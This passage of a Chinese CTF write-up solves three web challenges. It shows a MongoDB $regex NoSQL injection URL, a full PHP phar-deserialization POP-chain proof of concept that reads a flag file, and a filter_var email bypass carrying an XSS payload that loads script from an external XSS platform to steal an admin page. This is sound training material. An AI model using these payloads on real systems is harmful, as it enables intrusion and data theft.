class="line">            j = j+1</span><br><span class="line"></span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>其次就是验证</p>
+<p>码的问题，这个可以用python3的pytesseract库识别，当然也可以手工注入</p>
+<p>可以确定就是nosql注入了，那就很好办了，拿到正</p>
+<p>确密码，这里可以通过mongodb的条件操作符 $regex 来用正则匹配</p>
+<p>:</p>
+<p><a href="http://123.206.213.66:45678/check.php?username[$ne]=xxx&amp;password[$regex]=^xxx&amp;vertify=xxxx" target="_blank" rel="noopener">http://123.206.213.66:45678/check.php?username[$ne]=xxx&amp;password[$regex]=^xxx&amp;vertify=xxxx</a></p>
+<p>###SimplePHP</p>
+<p>upload_file.php处 上传文件</p>
+<p>file.php处 查看文件源码</p>
+<p>file.php源码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;content‐type:text/html;charset=utf‐8&quot;);</span><br><span class="line"></span><br><span class="line">include &apos;function.php&apos;;</span><br><span class="line"></span><br><span class="line">include &apos;class.php&apos;;</span><br><span class="line"></span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&apos;file&apos;] : &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(empty($file)) &#123;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = new Show();</span><br><span class="line"></span><br><span class="line">if(file_exists($file)) &#123;</span><br><span class="line"></span><br><span class="line">$show‐&gt;source = $file;</span><br><span class="line"></span><br><span class="line">$show‐&gt;_show();</span><br><span class="line"></span><br><span class="line">&#125; else if (!empty($file))&#123;</span><br><span class="line"></span><br><span class="line">die(&apos;file doesn\&apos;t exists.&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>function.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">include &quot;base.php&quot;;</span><br><span class="line"></span><br><span class="line">header(&quot;Content‐type: text/html;charset=utf‐8&quot;);</span><br><span class="line"></span><br><span class="line">error_reporting(E_ERROR | E_PARSE);</span><br><span class="line"></span><br><span class="line">foreach (array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line"> $$_key= addslashes($_value);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload_file_do() &#123;</span><br><span class="line"></span><br><span class="line">global $_FILES;</span><br><span class="line"></span><br><span class="line">$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;</span><br><span class="line"></span><br><span class="line">//mkdir(&quot;upload&quot;,0777);</span><br><span class="line"></span><br><span class="line">if(file_exists(&quot;upload/&quot; . $filename)) &#123;</span><br><span class="line"></span><br><span class="line"> unlink($filename);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload_file() &#123;</span><br><span class="line"></span><br><span class="line">global $_FILES;</span><br><span class="line"></span><br><span class="line">if(upload_file_check()) &#123;</span><br><span class="line"></span><br><span class="line"> upload_file_do();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload_file_check() &#123;</span><br><span class="line"></span><br><span class="line">global $_FILES;</span><br><span class="line"></span><br><span class="line">$allowed_types = array(&quot;gif&quot;,&quot;jepg&quot;,&quot;jpg&quot;,&quot;png&quot;);</span><br><span class="line"></span><br><span class="line">$temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line"></span><br><span class="line">$extension = end($temp);</span><br><span class="line"></span><br><span class="line">if(empty($extension)) &#123;</span><br><span class="line"></span><br><span class="line"> //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line"> if(in_array($extension,$allowed_types)) &#123;</span><br><span class="line"></span><br><span class="line"> return true;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> else &#123;</span><br><span class="line"></span><br><span class="line"> echo &apos;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invild file!&quot;);&lt;/script&gt;&apos;;</span><br><span class="line"></span><br><span class="line"> return false;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>class.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class C1e4r</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public $test;</span><br><span class="line"></span><br><span class="line">public $str;</span><br><span class="line"></span><br><span class="line">public function __construct($name)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $this‐&gt;str = $name;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $this‐&gt;test = $this‐&gt;str;</span><br><span class="line"></span><br><span class="line"> echo $this‐&gt;test;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public $source;</span><br><span class="line"></span><br><span class="line">public $str;</span><br><span class="line"></span><br><span class="line">public function __construct($file)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $this‐&gt;source = $file;</span><br><span class="line"></span><br><span class="line"> echo $this‐&gt;source;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __toString()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $content = $this‐&gt;str[&apos;str&apos;]‐&gt;source;</span><br><span class="line"></span><br><span class="line"> return $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __set($key,$value)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $this‐&gt;$key = $value;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function _show()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this‐&gt;source)) &#123;</span><br><span class="line"></span><br><span class="line"> die(&apos;hacker!&apos;);</span><br><span class="line"></span><br><span class="line"> &#125; else &#123;</span><br><span class="line"></span><br><span class="line"> highlight_file($this‐&gt;source);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __wakeup()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this‐&gt;source)) &#123;</span><br><span class="line"></span><br><span class="line"> echo &quot;hacker~&quot;;</span><br><span class="line"></span><br><span class="line"> $this‐&gt;source = &quot;index.php&quot;;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public $file;</span><br><span class="line"></span><br><span class="line">public $params;</span><br><span class="line"></span><br><span class="line">public function __construct()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $this‐&gt;params = array();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __get($key)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> return $this‐&gt;get($key);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function get($key)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if(isset($this‐&gt;params[$key])) &#123;</span><br><span class="line"></span><br><span class="line"> $value = $this‐&gt;params[$key];</span><br><span class="line"></span><br><span class="line"> &#125; else &#123;</span><br><span class="line"></span><br><span class="line"> $value = &quot;index.php&quot;;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> return $this‐&gt;file_get($value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function file_get($value)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> $text = base64_encode(file_get_contents($value));</span><br><span class="line"></span><br><span class="line"> return $text;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>照base.php的提示,flag就在 f1ag.php 中,那么可以通过读取f1ag.php文件来获取flag,只有highlight_file() 和 file_get_contents()函数可以获取文件内容但是上传文件处做了白名单,无法上传php_show 方法把f1agWAF掉，无法显示f1ag.php所以最后只有从 file_get_contents() 函数下手</p>
+<p>但是没有 serialize() 和 unserialize() 函数所以就没有办法直接触</p>
+<p>发 file_get_contents() 所在的 Test 类，结合文件上传的功能点，我们不难想到用上传phar包来触发反序列化</p>
+<p>phar触发反序列化漏洞有一下要求:</p>
+<ol>
+<li><p>存在文件操作函数,例如 file_exits() 、 file_get_contents() 等等，且其中的参数可控</p>
+</li>
+<li><p>在类中存在 __destruct 方法</p>
+</li>
+<li><p>可上传phar构造文件</p>
+</li>
+</ol>
+<p>推荐链接<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用phar拓展php反序列化攻击面</a></p>
+<p>file.php中存在 file_exits() ,且 $file 可控</p>
+<p>class.php中存在 __destruct() 方法</p>
+<p>function.php存在文件上传</p>
+<p><strong>get 方法是在访问一个类不存在或者是不可访问的变量时会触发。要想办法触发 </strong>get</p>
+<p>Show 类的 __toString 魔术方法中</p>
+<p>public function __toString()</p>
+<p>{</p>
+<p> $content = $this‐&gt;str[‘str’]‐&gt;source;</p>
+<p> return $content;</p>
+<p>}</p>
+<p>存在 $this‐&gt;str[‘str’]‐&gt;source ,如果 $this‐&gt;str[‘str’] 为 Test 类的话，那么就会访问不存在的 source 变量，当一个对象被当做</p>
+<p>字符串时调用会触发__toString 方法</p>
+<p>反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p>
+<p>所以构造poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class C1e4r</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $test;</span><br><span class="line"></span><br><span class="line">    public $str;</span><br><span class="line"></span><br><span class="line">    public function __construct($name)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line"></span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $source;</span><br><span class="line"></span><br><span class="line">    public $str;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line"></span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $content = $this-&gt;str[&apos;str&apos;]-&gt;source;</span><br><span class="line"></span><br><span class="line">        return $content;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set($key,$value)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) &#123;</span><br><span class="line"></span><br><span class="line">            die(&apos;hacker!&apos;);</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line"></span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line"></span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">    public $params;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get($key)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line"></span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function file_get($value)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line"></span><br><span class="line">        return $text;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag = new Test();</span><br><span class="line"></span><br><span class="line">$flag-&gt;params[&quot;source&quot;] = &quot;f1ag.php&quot;;</span><br><span class="line"></span><br><span class="line">$cls = new Show();</span><br><span class="line"></span><br><span class="line">$cls-&gt;str[&apos;str&apos;] = $flag;</span><br><span class="line"></span><br><span class="line">echo serialize(new C1e4r($cls));</span><br><span class="line"></span><br><span class="line">@unlink(&quot;bak6ry.phar&quot;);</span><br><span class="line"></span><br><span class="line">$test = new not_useful();</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;bak6ry.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line"></span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>执行后会生成一个交bak6ry.phar的文件，将他上传</p>
+<p>上传后保存的文件名是</p>
+<p>$filename = md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”;</p>
+<p>上传成功后,访问:file.php?file=phar://upload/文件名,base64解码后获得flag</p>
+<p>提醒phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。</p>
+<p>###有趣的邮箱注册</p>
+<p>两个功能点</p>
+<p>1.管理员页面</p>
+<p><a href="http://118.89.56.208:6324/admin/admin.php" target="_blank" rel="noopener">http://118.89.56.208:6324/admin/admin.php</a></p>
+<p>2.邮箱申请</p>
+<p><a href="http://118.89.56.208:6324/check.php" target="_blank" rel="noopener">http://118.89.56.208:6324/check.php</a></p>
+<p>然后发现访问管理员页面：only localhost allowed!</p>
+<p>最开始以为可以通过Ip伪造，结果试了很多种方式伪造ip都未生效</p>
+<p>邮箱处有个函数filter_var()匹配email的该函数有个漏洞<a href="https://xz.aliyun.com/t/2501单引号双引号重叠，用\可以绕过空格" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501单引号双引号重叠，用\可以绕过空格</a></p>
+<p>“&lt;script /src=//xss平台&gt;“@qq.com类似的方法，就可以绕过过滤，然后构造xss的payload如下</p>
+<p>“&lt;script /src=//xss平台&gt;“@qq.com</p>
+<p><img src="https://p4.ssl.qhimg.com/t015989a99824ac01f4.png" alt=""></p>
+<p>因为打不到管理员的cookie，就打admin.php的页面源码了</p>
+<p><img src="https://p0.ssl.qhimg.com/t0199a40de3ff596bd0.png" alt=""></p>
+<p>也可以用ajax去做</p>
